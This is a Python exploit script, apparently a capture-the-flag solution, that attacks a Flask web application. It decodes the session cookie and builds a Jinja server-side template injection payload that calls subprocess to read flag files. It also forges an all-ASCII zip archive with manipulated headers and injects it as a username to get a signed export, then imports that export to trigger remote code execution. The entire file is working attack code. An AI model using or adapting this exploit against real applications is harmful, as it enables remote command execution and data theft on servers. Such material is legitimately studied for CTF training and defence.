from ptrlib import *
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import base64
import binascii
import hashlib
import json
import os
import requests
import zipfile

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8018")

CODE  = "{{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('cat /flag*.txt',shell=True) }}"
CODE += "A"*(0x100 - len(CODE))

# Login as code executor
r = requests.post(f"http://{HOST}:{PORT}/api/login",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"username": "EvilFennec",
                                   "password": "TibetanFox"}))
fox_cookies = r.cookies
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
s = URLSafeTimedSerializer(
    b'',
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)
_, fox_session = s.loads_unsafe(fox_cookies["session"])
username = fox_session['username']
passhash = fox_session['passhash']
workdir = fox_session['workdir']

# Find ascii CRC32
logger.info("Searching CRC32...")
ORIG = CODE
while True:
    data = {
        "title": "exploit",
        "id": "exploit",
        "date": "1919/8/10 11:45:14",
        "author": "a",
        "content": CODE
    }
    x = json.dumps(data).encode()
    crc32 = binascii.crc32(x)
    if all([(crc32 >> i) & 0xff < 0x80 for i in range(0, 32, 8)]):
        if all([(len(x) >> i) & 0xff < 0x80 for i in range(0, 32, 8)]):
            break
        else:
            CODE = ORIG + 'A'*0x100
    else:
        CODE += "A"
logger.info("CRC Found: " + hex(crc32))
logger.info("ASCII Length: " + hex(len(x)))
logger.info(CODE)

# Create a malicious zip comment
os.makedirs(f"post/{workdir}", exist_ok=True)
with open(f"post/{workdir}/exploit.json", "w") as f:
    json.dump(data, f)
with zipfile.ZipFile("exploit.zip", "w", zipfile.ZIP_STORED) as z:
    z.write(f"post/{workdir}/exploit.json")
    z.comment = f'SIGNATURE:{username}:{passhash}'.encode()

# Malform zip
logger.info("Creating ascii zip...")
size_original = 0x30
while True:
    with open("exploit.zip", "rb") as f:
        payload = f.read()
        sz = len(payload)

    lfh = payload.find(b'PK\x03\x04')
    cdh = payload.find(b'PK\x01\x02')
    ecdr = payload.find(b'PK\x05\x06')

    ## 1. Modify End of Central Directory Record
    # Modify offset to CDH
    payload = payload[:ecdr+0x10] + p32(cdh+size_original) + payload[ecdr+0x14:]

    ## 2. Modify Central Directory Header
    # Modify relative offset to LFH
    payload = payload[:cdh+0x2a] + p32(0x000 + size_original) + payload[cdh+0x2e:]
    # Modify timestamp
    payload = payload[:cdh+0xa] + p32(0) + payload[cdh+0xe:]
    # Modify attr
    payload = payload[:cdh+0x26] + p32(0x00000000) + payload[cdh+0x2a:]

    ## 3. Modify Local File Header
    # Modify timestamp
    payload = payload[:lfh+0xa] + p32(0) + payload[lfh+0xe:]
    payload = b"A" * (size_original - 0x30) + payload

    for c in payload:
        if c > 0x7f:
            break
    else:
        break

    size_original += 1
logger.info("Created ascii zip!")

# ZIP comment injection
r = requests.post(f"http://{HOST}:{PORT}/api/login",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"username": bytes2str(payload),
                                   "password": "whatever"}))
cookies = r.cookies
logger.info("Registered malicious user")

# Export crafted exploit
r = requests.get(f"http://{HOST}:{PORT}/api/export",
                 cookies=cookies)
exp = json.loads(r.text)["export"]
logger.info("Exploit exported!")

# Import the exploit
r = requests.post(f"http://{HOST}:{PORT}/api/import",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"import": exp}),
                  cookies=fox_cookies)
logger.info("Exploit imported!")

# Leak flag
logger.info("SSTI go brrrr...")
r = requests.get(f"http://{HOST}:{PORT}/post/exploit",
                 cookies=fox_cookies)
print(r.text)
